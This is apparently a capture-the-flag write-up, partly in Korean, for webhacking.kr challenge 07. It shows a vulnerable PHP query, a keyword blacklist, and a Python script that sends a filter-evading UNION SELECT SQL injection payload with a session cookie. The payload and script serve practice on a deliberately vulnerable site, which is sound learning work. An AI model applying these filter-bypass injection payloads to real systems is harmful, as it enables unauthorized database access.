================================================================================================================
[webhacking.kr] 07
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="val='+'1)%0aunion%0aselect%0a3-1%23)",arrowhead="normal"];
        step3 -> step2[label="login success",arrowhead="normal"];
    }

|

server -> DB
================================================================================================================

- PHP
- GET 파라미터: val

.. code-block:: sql
    
    select lv from lv1 where 
    lv=($_GET[val])

|

union select
================================================================================================================

- eregi로 필터링되는 함수를 제외하여 rand가 1일 때 실행할 수 있는 쿼리문을 작성해보자.
- eregi("--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|<>|sysM|and|or|table|column",$ck)


.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-07/index.php?val='+'1)%0aunion%0aselect%0a3-1%23)"
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    
    r = requests.get(url, cookies = cookies, verify=False)

    print r.content
